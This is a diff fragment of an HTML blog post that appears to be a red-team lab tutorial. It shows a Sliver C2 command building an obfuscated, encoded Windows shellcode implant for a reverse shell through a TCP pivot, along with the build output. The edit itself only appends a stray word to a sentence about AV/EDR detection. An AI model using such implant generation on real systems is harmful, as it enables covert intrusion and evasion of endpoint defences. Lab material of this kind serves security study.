@@ -152,7 +152,7 @@ Moreover, this will be build on the same lab infrastructre from previous posts, 
 </li>
 <li><p>Then generate a payload of type shellcode to be used for reverse shell.</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sliver (PREMIER_PIPE) &gt; generate --tcp-pivot 192.168.24.22:9898 -f shellcode -s /tmp/</span><br><span class="line"></span><br><span class="line">[*] Generating new windows/amd64 implant binary</span><br><span class="line">[*] Symbol obfuscation is enabled</span><br><span class="line">[*] Build completed in 23s</span><br><span class="line">[*] Encoding shellcode with shikata ga nai ... success!</span><br><span class="line">[*] Implant saved to /tmp/PREMIER_PIPE.bin</span><br></pre></td></tr></table></figure></li>
-<li><p>Because the C2 payload most likely will be caught by AV&#x2F;EDR</p>
+<li><p>Because the C2 payload most likely will be caught by AV&#x2F;EDR, sasa</p>
 </li>
 </ol>
 
